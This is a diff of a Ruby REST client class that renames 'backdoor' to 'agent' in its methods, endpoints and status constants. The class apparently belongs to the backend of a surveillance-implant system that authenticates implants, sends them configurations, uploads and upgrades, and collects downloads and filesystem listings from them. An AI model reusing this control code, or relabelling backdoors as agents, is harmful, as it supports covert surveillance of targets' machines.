@@ -173,13 +173,13 @@ class DB_rest
     end
   end
 
-  def backdoor_signature
+  def agent_signature
     begin
-      ret = rest_call('GET', '/signature/backdoor')
+      ret = rest_call('GET', '/signature/agent')
       sign = JSON.parse(ret.body)['value']
       return sign
     rescue Exception => e
-      trace :error, "Error calling backdoor_signature: #{e.class} #{e.message}"
+      trace :error, "Error calling agent_signature: #{e.class} #{e.message}"
       propagate_error e
     end
   end
@@ -195,13 +195,13 @@ class DB_rest
     end
   end
 
-  # used to authenticate the backdoors
+  # used to authenticate the agents
   def factory_keys(ident = '')
     begin
       if ident != '' then
-        ret = rest_call('GET', "/backdoor/factory_keys/#{ident}")
+        ret = rest_call('GET', "/agent/factory_keys/#{ident}")
       else
-        ret = rest_call('GET', '/backdoor/factory_keys')
+        ret = rest_call('GET', '/agent/factory_keys')
       end
       return JSON.parse(ret.body)
     rescue Exception => e
@@ -210,37 +210,37 @@ class DB_rest
     end
   end
 
-  # backdoor identify
-  def backdoor_status(build_id, instance_id, subtype)
+  # agent identify
+  def agent_status(build_id, instance_id, subtype)
     begin
       request = {:ident => build_id, :instance => instance_id, :subtype => subtype}
-      ret = rest_call('GET', '/backdoor/status/?' + CGI.encode_query(request))
+      ret = rest_call('GET', '/agent/status/?' + CGI.encode_query(request))
       
-      return DB::NO_SUCH_BACKDOOR, 0 if ret.kind_of? Net::HTTPNotFound
+      return DB::NO_SUCH_AGENT, 0 if ret.kind_of? Net::HTTPNotFound
 
       status = JSON.parse(ret.body)
 
       bid = status['_id']
 
-      return DB::DELETED_BACKDOOR, bid if status['deleted'] == true
+      return DB::DELETED_AGENT, bid if status['deleted'] == true
 
       case status['status']
         when 'OPEN'
-          return DB::ACTIVE_BACKDOOR, bid
+          return DB::ACTIVE_AGENT, bid
         when 'QUEUED'
-          return DB::QUEUED_BACKDOOR, bid
+          return DB::QUEUED_AGENT, bid
         when 'CLOSED'
-          return DB::CLOSED_BACKDOOR, bid
+          return DB::CLOSED_AGENT, bid
       end
     rescue Exception => e
-      trace :error, "Error calling backdoor_status: #{e.class} #{e.message}"
-      return DB::UNKNOWN_BACKDOOR, 0
+      trace :error, "Error calling agent_status: #{e.class} #{e.message}"
+      return DB::UNKNOWN_AGENT, 0
     end
   end
 
   def new_conf(bid)
     begin
-      ret = rest_call('GET', "/backdoor/config/#{bid}")
+      ret = rest_call('GET', "/agent/config/#{bid}")
 
       if ret.kind_of? Net::HTTPNotFound then
         return nil
@@ -255,7 +255,7 @@ class DB_rest
 
   def activate_conf(bid)
     begin
-      return rest_call('DELETE', "/backdoor/config/#{bid}")
+      return rest_call('DELETE', "/agent/config/#{bid}")
     rescue Exception => e
       trace :error, "Error calling activate_conf: #{e.class} #{e.message}"
       propagate_error e
@@ -264,14 +264,14 @@ class DB_rest
 
   def new_uploads(bid)
     begin
-      ret = rest_call('GET', "/backdoor/uploads/#{bid}")
+      ret = rest_call('GET', "/agent/uploads/#{bid}")
 
       upl = {}
       # parse the results and get the contents of the uploads
       JSON.parse(ret.body).each do |elem|
         request = {:upload => elem['_id']}
         upl[elem['_id']] = {:filename => elem['filename'],
-                            :content => rest_call('GET', "/backdoor/upload/#{bid}?" + CGI.encode_query(request)).body }
+                            :content => rest_call('GET', "/agent/upload/#{bid}?" + CGI.encode_query(request)).body }
         trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['_id']][:content].length} bytes"
       end
       
@@ -284,7 +284,7 @@ class DB_rest
 
   def del_upload(bid, id)
     begin
-      return rest_call('DELETE', "/backdoor/upload/#{bid}?" + CGI.encode_query({:upload => id}))
+      return rest_call('DELETE', "/agent/upload/#{bid}?" + CGI.encode_query({:upload => id}))
     rescue Exception => e
       trace :error, "Error calling del_upload: #{e.class} #{e.message}"
       propagate_error e
@@ -293,14 +293,14 @@ class DB_rest
 
   def new_upgrades(bid)
     begin
-      ret = rest_call('GET', "/backdoor/upgrades/#{bid}")
+      ret = rest_call('GET', "/agent/upgrades/#{bid}")
 
       upgr = {}
       # parse the results and get the contents of the uploads
       JSON.parse(ret.body).each do |elem|
         request = {:upgrade => elem['upgrade_id']}
         upgr[elem['upgrade_id']] = {:filename => elem['filename'],
-                                    :content => rest_call('GET', "/backdoor/upgrade/#{bid}?" + CGI.encode_query(request)).body }
+                                    :content => rest_call('GET', "/agent/upgrade/#{bid}?" + CGI.encode_query(request)).body }
         trace :debug, "File retrieved: [#{elem['filename']}] #{upgr[elem['upgrade_id']][:content].length} bytes"
       end
 
@@ -313,7 +313,7 @@ class DB_rest
 
   def del_upgrade(bid)
     begin
-      return rest_call('DELETE', "/backdoor/upgrade/#{bid}")
+      return rest_call('DELETE', "/agent/upgrade/#{bid}")
     rescue Exception => e
       trace :error, "Error calling del_upgrade: #{e.class} #{e.message}"
       propagate_error e
@@ -323,7 +323,7 @@ class DB_rest
   # retrieve the download list from db (if any)
   def new_downloads(bid)
     begin
-      ret = rest_call('GET', "/backdoor/downloads/#{bid}")
+      ret = rest_call('GET', "/agent/downloads/#{bid}")
 
       down = {}
       # parse the results
@@ -340,7 +340,7 @@ class DB_rest
 
   def del_download(bid, id)
     begin
-      return rest_call('DELETE', "/backdoor/download/#{bid}?" + CGI.encode_query({:download => id}))
+      return rest_call('DELETE', "/agent/download/#{bid}?" + CGI.encode_query({:download => id}))
     rescue Exception => e
       trace :error, "Error calling del_download: #{e.class} #{e.message}"
       propagate_error e
@@ -350,7 +350,7 @@ class DB_rest
   # retrieve the filesystem list from db (if any)
   def new_filesystems(bid)
     begin
-      ret = rest_call('GET', "/backdoor/filesystems/#{bid}")
+      ret = rest_call('GET', "/agent/filesystems/#{bid}")
 
       files = {}
       # parse the results
@@ -367,7 +367,7 @@ class DB_rest
 
   def del_filesystem(bid, id)
     begin
-      return rest_call('DELETE', "/backdoor/filesystem/#{bid}?" + CGI.encode_query({:filesystem => id}))
+      return rest_call('DELETE', "/agent/filesystem/#{bid}?" + CGI.encode_query({:filesystem => id}))
     rescue Exception => e
       trace :error, "Error calling del_filesystem: #{e.class} #{e.message}"
       propagate_error e
